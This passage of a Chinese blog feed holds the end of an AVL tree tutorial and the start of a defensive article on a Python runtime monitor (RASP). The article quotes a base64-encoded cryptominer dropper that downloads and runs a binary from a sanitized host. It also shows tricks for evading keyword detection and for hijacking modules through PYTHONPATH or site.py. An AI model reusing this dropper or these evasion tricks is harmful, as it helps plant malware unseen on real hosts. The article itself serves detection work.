&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1469015/201902/1469015-20190209171144083-1349620874.png&quot; alt=&quot;&quot; width=&quot;673&quot; height=&quot;227&quot;/&gt;&lt;/p&gt;
&lt;p&gt;RR与LL形式差不多，只不顾是反着来的。相当于进行一次左旋转。&lt;/p&gt;
&lt;p&gt;RR与LL都只进行一次旋转即可，而LR与RL需要进行两次旋转&lt;/p&gt;
&lt;h6 id=&quot;3-lr&quot;&gt;3.LR&lt;/h6&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1469015/201902/1469015-20190209172252025-1015745337.png&quot; alt=&quot;&quot; width=&quot;845&quot; height=&quot;267&quot;/&gt;&lt;/p&gt;
&lt;p&gt;第一次相当于对5、10、15、17这棵子树进行了一次RR旋转，旋转方式与之前的RR方式相同，就像是以15为中心向左旋转，旋转的结果使得整棵树变成了LL的不平衡形态，然后再按照LL的旋转方式对整棵树处理。&lt;/p&gt;
&lt;h6 id=&quot;4-rl&quot;&gt;4.RL&lt;/h6&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1469015/201902/1469015-20190209174812794-1294182176.png&quot; alt=&quot;&quot; width=&quot;839&quot; height=&quot;251&quot;/&gt;&lt;/p&gt;
&lt;p&gt;RL同样是LR的相反模式，先将22、25、30、40这棵子树进行LL旋转，再将整棵树进行RR旋转&lt;/p&gt;
&lt;p&gt;理解了avl保持平衡从方式后，就可以用代码来实现了&lt;/p&gt;

&lt;p&gt;我们使用AVL对上一篇文章中的有序映射进行优化&lt;/p&gt;
&lt;p&gt;因为AVL依赖于节点的高度，所以首先要重写一下Node类:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs language-python&quot;&gt;
&lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;AvlTree&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(OrderedMap)&lt;/span&gt;:&lt;/span&gt;

    &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(OrderedMap.Node)&lt;/span&gt;:&lt;/span&gt;
        &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(self, element, parent=None, left=None, right=None)&lt;/span&gt;:&lt;/span&gt;
            super().__init__(element,parent,left,right)
            self.height = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;

        &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;left_height&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(self)&lt;/span&gt;:&lt;/span&gt;
            &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; self.left.height &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; self.left &lt;span class=&quot;hljs-keyword&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;None&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;

        &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;right_height&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(self)&lt;/span&gt;:&lt;/span&gt;
            &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; self.right.height &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; self.right &lt;span class=&quot;hljs-keyword&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;None&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接下来定义4中调整的非公开方法&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs language-python&quot;&gt;
&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;_left_left&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(self,p)&lt;/span&gt;:&lt;/span&gt;
    this = p.node        
    left = this.left
    parent = this.parent
    left_right = this.left.right
    &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; parent &lt;span class=&quot;hljs-keyword&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;None&lt;/span&gt;:
        &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; this &lt;span class=&quot;hljs-keyword&quot;&gt;is&lt;/span&gt; parent.left:
            parent.left = left
        &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;:
            parent.right = left
    &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;:
        self._root = left
    this.parent = left
    left.parent = parent
    this.left = left_right
    left.right = this
    &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; left_right &lt;span class=&quot;hljs-keyword&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;None&lt;/span&gt;:
        left_right.parent = this

&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;_right_right&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(self,p)&lt;/span&gt;:&lt;/span&gt;
    this = p.node                 
    right = this.right
    parent = this.parent
    right_left = this.right.left
    &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; parent &lt;span class=&quot;hljs-keyword&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;None&lt;/span&gt;:
        &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; this &lt;span class=&quot;hljs-keyword&quot;&gt;is&lt;/span&gt; parent.left:
            parent.left = right
        &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;:
            parent.right = right
    &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;:
        self._root = right
    this.parent = right
    right.parent = parent
    this.right = right_left
    right.left = this
    &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; right_left &lt;span class=&quot;hljs-keyword&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;None&lt;/span&gt;:
        right_left.parent = this

&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;_left_right&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(self,p)&lt;/span&gt;:&lt;/span&gt;
    self._right_right(self.left(p))
    self._left_left(p)

&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;_right_left&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(self,p)&lt;/span&gt;:&lt;/span&gt;
    self._left_left(self.right(p))
    self._right_right(p)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后是用于平衡二叉树的方法，也就是根据情况调用上边那4种策略&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs language-python&quot;&gt;
&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;_isbalanced&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(self,p)&lt;/span&gt;:&lt;/span&gt;
    &lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&quot;判断节点是否平衡&quot;&quot;&quot;&lt;/span&gt;

    &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; abs(p.node.left_height() - p.node.right_height()) &amp;lt;= &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;

&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;_recompute_height&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(self,p)&lt;/span&gt;:&lt;/span&gt;
    &lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&quot;重新计算高度&quot;&quot;&quot;&lt;/span&gt;
    p.node.height = &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt; + max(p.node.left_height(),p.node.right_height())

&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;_rebalanced&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(self,p)&lt;/span&gt;:&lt;/span&gt;
    &lt;span class=&quot;hljs-keyword&quot;&gt;while&lt;/span&gt; p &lt;span class=&quot;hljs-keyword&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;None&lt;/span&gt;:
        &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; self._isbalanced(p):
            self._recompute_height(p)
            p = self.parent(p)
        &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;:

            &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; p.node.left_height()&amp;gt;p.node.right_height() &lt;span class=&quot;hljs-keyword&quot;&gt;and&lt;/span&gt; p.node.left.left_height()&amp;gt;p.node.left.right_height():
                
                self._left_left(p)
            &lt;span class=&quot;hljs-keyword&quot;&gt;elif&lt;/span&gt; p.node.right_height()&amp;gt;p.node.left_height() &lt;span class=&quot;hljs-keyword&quot;&gt;and&lt;/span&gt; p.node.right.right_height()&amp;gt;p.node.right.left_height():
                
                self._right_right(p)
            &lt;span class=&quot;hljs-keyword&quot;&gt;elif&lt;/span&gt; p.node.left_height()&amp;gt;p.node.right_height() &lt;span class=&quot;hljs-keyword&quot;&gt;and&lt;/span&gt; p.node.left.left_height()&amp;lt;p.node.left.right_height():
                
                left = self.left(p)
                self._left_right(p)
                self._recompute_height(left)
            &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;:
                
                right = self.right(p)
                self._right_left(p)
                self._recompute_height(right)
            &lt;span class=&quot;hljs-keyword&quot;&gt;while&lt;/span&gt; p &lt;span class=&quot;hljs-keyword&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;None&lt;/span&gt;:
                
                self._recompute_height(p)
                p = self.parent(p)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后把方法封装成删除时和插入时的两个方法，虽然执行的内容是相同的&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs language-python&quot;&gt;
&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;_rebalanced_insert&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(self,p)&lt;/span&gt;:&lt;/span&gt;
    &lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&quot;插入时的平衡调整&quot;&quot;&quot;&lt;/span&gt;
    self._rebalanced(p)

&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;_rebalanced_delete&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(self, p)&lt;/span&gt;:&lt;/span&gt;
    &lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&quot;删除时的平衡调整&quot;&quot;&quot;&lt;/span&gt;
    self._rebalanced(p)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;最后重写一下setitem方法与删除时调用的方法&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs language-python&quot;&gt;
&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;__setitem__&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(self, k, v)&lt;/span&gt;:&lt;/span&gt;
    &lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&quot;优化setitem&quot;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; self.is_empty():
        leaf = self.add_root(self._Item(k, v))
    &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;:

        p = self._subtree_search(self.root(), k)
        &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; p.key() == k:
            p.element().value = v
            &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt;
        &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;:
            item = self._Item(k, v)
            &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; p.key() &amp;lt; k:
                leaf = self.add_right(p, item)
            &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;:
                leaf = self.add_left(p, item)
    self._rebalanced_insert(leaf)

&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;mapdelete&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(self, p)&lt;/span&gt;:&lt;/span&gt;
    &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; self.left(p) &lt;span class=&quot;hljs-keyword&quot;&gt;and&lt;/span&gt; self.right(p):  
        replacement = self._subtree_last_position(
            self.left(p))  
        self.replace(p, replacement.element())
        p = replacement
    parent = self.parent(p)
    self.delete(p)
    self._rebalanced_delete(parent)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在实现4种平衡策略时，一定要记着将整棵树的根节点更新，不然遍历的时候，根节点指的就不是真正的根节点了。&lt;/p&gt;
&lt;p&gt;​&lt;/p&gt;
</description>
<pubDate>Sun, 10 Feb 2019 05:32:00 +0000</pubDate>
<dc:creator>sfencs</dc:creator>
<og:description>前言 上一篇文章讨论的二叉搜索树，其时间复杂度最好的情况下是O(log(n))，但是最坏的情况是O(n)，什么时候是O(n)呢？ 像这样： 如果先插入10，再插入20，再插入30，再插入40就会成上边</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/sfencs-hcy/p/10356467.html</dc:identifier>
</item>
<item>
<title>Python RASP 工程化:一次入侵的思考 - 七夜的故事</title>
<link>http://www.cnblogs.com/qiyeboy/p/10359081.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/qiyeboy/p/10359081.html</guid>
<description>&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;今天讲的内容会很深，包括一些 Python的高级用法和一些自己创造的黑科技，前半部分内容你们可能听过，后半部分内容就真的是黑科技了。。。&lt;/p&gt;
&lt;p&gt;深入的研究和思考，总会发现很多有意思的东西。每一次的研究，都不会是无缘无故的，下面开始我们今天的故事。（&lt;strong&gt;注意文末有花絮&lt;/strong&gt;）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Tips&lt;/strong&gt;: RASP,全称应用运行时自我保护解决方案，可以简单理解为部署在应用环境的监控防御程序。&lt;/p&gt;

&lt;h2&gt;万事有因果&lt;/h2&gt;
&lt;p&gt;本次的研究 来源于 &lt;strong&gt;对一次入侵手法的思考&lt;/strong&gt;，众所周知，在linux主机上，挖矿木马比较流行。现在挖比特币的相对少了，又有挖门罗币的。这些木马的植入不会说直接传文件上去，这样动作太大，更多的是通过执行shell命令，远程下载文件并执行 。以如下情况为例，很特别，这是一个通过Python命令植入的挖矿木马：&lt;/p&gt;

&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;python -c 'exec(&quot;aW1wb3J0IG9zOyBpbXBvcnQgdXJsbGliOyBoZCA9IHVybGxpYi51cmxyZXRyaWV2ZSAoImh0dHA6Ly8xMjcuMC4wLjEvanAvam0iLCAiL3Zhci90bXAvc3ZyIik7IG9zLnN5c3RlbSgiY2htb2QgK3ggL3Zhci90bXAvc3ZyIik7IG9zLnN5c3RlbSgiL3Zhci90bXAvc3ZyIik7&quot;.decode(&quot;base64&quot;))'&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;通过base64解密之后的内容(ip脱敏了)：&lt;/p&gt;

&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;import os; import urllib; hd = urllib.urlretrieve (&quot;http://127.0.0.1/jp/jm&quot;, &quot;/var/tmp/svr&quot;); os.system(&quot;chmod +x /var/tmp/svr&quot;); os.system(&quot;/var/tmp/svr&quot;);&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;通过base64隐藏真实代码是一个常用的方式，不能说这样做很高明，这条命令特征相对还是比较明显了。&lt;/p&gt;

&lt;p&gt;现有的防御办法是静态分析，通过抓取Python 进程参数，匹配关键字，比如exec,decode,base64 就会很容易发现。但是如果咱们脑暴一下做一次静态策略绕过，你会发现静态分析是多么的脆弱。&lt;/p&gt;
&lt;p&gt;1.绕过 base64&lt;/p&gt;

&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;&quot;base64&quot; = 'case64'.replace('c','b') = '1base641'[1:7]&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;2. 绕过decode (或者直接不用编码)&lt;/p&gt;

&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;str.__dict__[&quot;dec&quot;+&quot;ode&quot;]('aW1wb3J0IG1hdGg7YT0xMDtiPW1hdGgubG9nKGEpO3ByaW50KGIpOwo=','base64')&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;3.终极绝招(&lt;strong&gt;妙用管道，让你抓不到Python参数&lt;/strong&gt;)&lt;/p&gt;

&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;echo &quot;exec('aW1wb3J0IG1hdGg7YT0xMDtiPW1hdGgubG9nKGEpO3ByaW50KGIpOwo='.decode('base64'*1))&quot; | python&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;相信到第3步，静态分析已经穷途末路，你连数据都没有了。&lt;/p&gt;

&lt;p&gt;这3次绕过是想说明一个问题，Python语言很灵活，尤其和shell结合后，静态分析这条路已经解决不了实际问题。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;问题出在哪呢&lt;/strong&gt;？问题出在Python语言本身，语法的灵活对静态分析是致命的。我总结了这么一句话，大家可以回味一下：&lt;/p&gt;

&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;当字符串可以当作代码执行时，静态分析的尽头也就到了&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;那该怎么解决呢&lt;/strong&gt;？从Python语言本身出发，监控整个Python的动态行为，这就是Python RASP。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;研究Python RASP值不值得花时间呢&lt;/strong&gt;？ 你只需要知道每个linux主机上都会预装Python环境，你就知道它的威胁了。&lt;/p&gt;

&lt;p&gt;说实话，有开源的PHP RASP，JAVA RASP，还真的没有Python RASP，下面的研究完全是一个摸索的过程。&lt;/p&gt;

&lt;p&gt;在研究的过程中，我碰到&lt;strong&gt;两次僵局&lt;/strong&gt;，穷途陌路之感，差一点以为Python RASP 不能发挥很大的作用。&lt;/p&gt;

&lt;h2&gt;Monkey Patch 与 依赖注入&lt;/h2&gt;
&lt;p&gt;Python RASP的行为监控，简单来说就是&lt;strong&gt;hook关键函数&lt;/strong&gt;，将函数的参数和返回值，送回策略进行过滤。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（1） Monkey Patch&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;说到hook，首先想到的是Monkey Patch这种方法，对于Python的理念来说，一切皆对象，我们可以动态修改Python中的对象。举个例子：&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/899843/201902/899843-20190207095200504-1593238182.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;在主函数中，修改open内置函数，给open添加的了日志打印的功能。运行效果如下，成功的打印出了日志：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/899843/201902/899843-20190207095233707-373554536.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;函数调用顺序如下：&lt;/p&gt;

&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;&lt;strong&gt;open('1.txt','r') -&amp;gt;__call__ -&amp;gt;_pre_hook  -&amp;gt; post_hook -&amp;gt; return&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;但是你有没有发现问题，也就是说&lt;strong&gt;我们需要将hook代码添加到用户代码之前，这不现实&lt;/strong&gt;？&lt;/p&gt;
&lt;p&gt;现有业务中这么多项目，这么多脚本，每个项目的代码，我都要改的话，我猜业务同学会杀策略祭天。因此Monkey Patch 这种方式&lt;strong&gt;暂时放弃&lt;/strong&gt;了，换个思路。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（2）依赖注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果大家之前做过dll劫持，有一种方式是根据dll加载顺序的先后进行劫持的，同样python中我们也可以用这种方式来做。以import os为例，Python是如何找到os模块呢？搜索顺序如下：&lt;/p&gt;

&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;&lt;strong&gt;当前目录 -&amp;gt; $PYTHONPATH -&amp;gt; Lib库目录 -&amp;gt; site-package 第三方模块路径&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;我们要利用的就是&lt;strong&gt;$PYTHONPATH&lt;/strong&gt;环境变量指定的目录，在这个目录下，新建os.py文件，import os就不会去 &lt;strong&gt;Lib库目录 &lt;/strong&gt;中查找模块，从而实现了&lt;strong&gt;劫持&lt;/strong&gt;&lt;strong&gt;。 我们既可以劫持函数，也可以劫持类。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.1 劫持os模块下的system函数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;首先在当前pythonpath路径下创建os.py文件，然后重载一下os模块，最后使用_InstallFcnHook改变system。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2.2 劫持socket模块下的_fileObject类&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;劫持类，我们需要用到Python中元类的概念。元类就是用来创建类的类，函数type实际上是一个元类。&lt;/p&gt;
&lt;p&gt;元类的主要目的就是为了&lt;strong&gt;当创建类时能够自动地改变类，&lt;/strong&gt;使用元类来劫持类再合适不过了。需要用到的主要方法和属性如下：&lt;/p&gt;

&lt;ul class=&quot;list-paddingleft-2&quot; readability=&quot;3.5&quot;&gt;&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;&lt;strong&gt;__metaclass__&lt;/strong&gt;：你可以在写一个类的时候为其添加__metaclass__属性, Python就会用它来创建类。__metaclass__可以接受任何可调用的对象，你可以在__metaclass__中放置可以创建一个类的东西&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;strong&gt;__new__:&lt;/strong&gt;是用来创建类并返回这个类的实例&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;&lt;strong&gt;__call__&lt;/strong&gt;:任何类，只需要定义一个__call__()方法，就可以直接对实例进行调用,用callable来判断是否可被调用&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;strong&gt;__getattribute__&lt;/strong&gt;:定义了你的属性被访问时的行为&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;劫持fileObject类，首先在当前pythonpath路径下创建socket.py文件，然后使用_installclshook动态修改此类，当访问_fileobject的属性方法时，返回到_hook_writeline 和 _hook_readline。&lt;/p&gt;

&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/899843/201902/899843-20190210124005616-1336001356.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;依赖注入这种方法，有一个&lt;strong&gt;很大的缺陷&lt;/strong&gt;，就是&lt;strong&gt;内置模块中的类和函数没办法劫持&lt;/strong&gt;。以__builtin__内置模块为例，这个模块是Python虚拟机中内置的，在虚拟机启动之前就已经加载完毕，不会再去pythonpath中去查找，常见的open函数，decode函数都是没办法劫持的。&lt;/p&gt;
&lt;p&gt;虽然使用Monkey Patch能解决，但是依旧有上面所说的原因，没办法工程化，这就很苦恼。&lt;/p&gt;

&lt;h2&gt; 破局 到 再次入局&lt;/h2&gt;

&lt;p&gt;出现僵局总得解决，有一点可以确定的是 Monkey Patch 可以hook内置函数，那要解决的问题就是&lt;strong&gt;如何让hook代码永远在在用户代码之前运行，&lt;/strong&gt;这样我们的hook才能有效控制函数调用。&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;脑洞大开&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;在用户代码运行之前是谁运行呢？&lt;strong&gt;肯定是Python虚拟机先运行&lt;/strong&gt;。如果Python虚拟机启动的过程中，预加载了一些模块，你把我们的代码插入这些模块中，不就可以比用户代码先运行了！！！&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;有时候真的是需要脑洞，事实证明我走对了&lt;/strong&gt;。网上所有关于monkey patch 的资料，都是在教你修改用户代码，添加hook函数，实现动态修改，这种方式还真没有，&lt;strong&gt;可以加个鸡腿了&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;脑洞开完之后，下面就需要进行&lt;strong&gt;苦逼的分析&lt;/strong&gt;，你要分析Python虚拟机的初始化过程，必须要看&lt;strong&gt;Python源代码&lt;/strong&gt;了。我就不带大家看代码了，给出一个Python虚拟机模块大致的加载过程。&lt;/p&gt;


&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/899843/201902/899843-20190210124209944-251698330.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;Python虚拟机在设置模块路径时，其中的第三方模块路径是&lt;strong&gt;加载site.py模块&lt;/strong&gt;进行设置的。Python源码部分如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/899843/201902/899843-20190210124241322-703595626.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;以Windows py2.7为例，打开&lt;strong&gt;D:\Python27\Lib目录下的site.py文件&lt;/strong&gt;，将我们在第二节中的hook代码&lt;strong&gt; 引入到文件末尾&lt;/strong&gt;即可，这样无论运行什么样子的用户代码，都会&lt;strong&gt;首先加载我们的hook代码&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/899843/201902/899843-20190210124337533-1838953907.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;本以为到此就结束了，可是&lt;strong&gt;才发现&lt;/strong&gt;&lt;strong&gt;刚刚入坑&lt;/strong&gt;&lt;strong&gt;而已&lt;/strong&gt;。因为就在我打算hook内置 __builtin__模块str类的decode时，出现了异常。&lt;/p&gt;

&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/899843/201902/899843-20190210124423344-602155729.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;google了一下异常信息，得出一个结论：Monkey Patch可以修改内置模块中的函数，但是&lt;strong&gt;没办法修改内置模块中的类属性，&lt;/strong&gt;比如str的decode函数就没办法了。&lt;/p&gt;
&lt;p&gt;其实到这就可以结束了，因为大部分模块，我们都可以hook住了，但是&lt;strong&gt;感觉有缺憾，不够完美，还是有漏的，束缚了RASP的能力，因此又有了接下来的黑科技，开脑洞吧。。。&lt;/strong&gt;&lt;/p&gt;

&lt;h2&gt;&lt;strong&gt;脑洞黑科技&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt; 这时候能用的技术都用完了，真是穷途末路了。。。需要点灵感！！！&lt;/p&gt;

